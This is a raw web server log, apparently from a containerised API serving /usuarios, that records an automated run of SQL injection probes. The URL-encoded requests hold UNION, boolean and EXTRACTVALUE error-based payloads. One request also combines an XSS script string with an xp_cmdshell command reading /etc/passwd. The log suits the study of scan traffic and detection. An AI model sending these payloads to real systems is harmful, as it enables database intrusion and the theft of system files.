api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios?HfST=9051%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /4572 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2C%2C%2C.%28%22%29%27%28%28 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27UwlnsX%3C%27%22%3EEgSpgV HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F4635%3D1633%2F%2A%2A%2FAND%2F%2A%2A%2F%284367%3D4367 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F2397%3D2397%2F%2A%2A%2FAND%2F%2A%2A%2F%287199%3D7199 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F1462%3D8002 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F2397%3D2397 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5752%3D9926%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27yekA%27%3D%27yekA HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2397%3D2397%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27MkLq%27%3D%27MkLq HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F2195%3D3902%2F%2A%2A%2FAND%2F%2A%2A%2F%27cihb%27%3D%27cihb HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F2397%3D2397%2F%2A%2A%2FAND%2F%2A%2A%2F%27xueC%27%3D%27xueC HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F8078%3D3634--%2F%2A%2A%2FEZWa HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F2397%3D2397--%2F%2A%2A%2FqgcV HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D8884%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27usuarios%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8884%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3194%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288617%3D8617%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27usuarios%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1743%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9246%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285623%2CCONCAT%280x5c%2C0x7171786b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285623%3D5623%2C1%29%29%29%2C0x7162707a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282360%3D2360 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285623%2CCONCAT%280x5c%2C0x7171786b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285623%3D5623%2C1%29%29%29%2C0x7162707a71%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285623%2CCONCAT%280x5c%2C0x7171786b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285623%3D5623%2C1%29%29%29%2C0x7162707a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27OGZm%27%3D%27OGZm HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285623%2CCONCAT%280x5c%2C0x7171786b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285623%3D5623%2C1%29%29%29%2C0x7162707a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27XXEQ%27%3D%27XXEQ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285623%2CCONCAT%280x5c%2C0x7171786b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285623%3D5623%2C1%29%29%29%2C0x7162707a71%29%29--%2F%2A%2A%2FJlmk HTTP/1.1
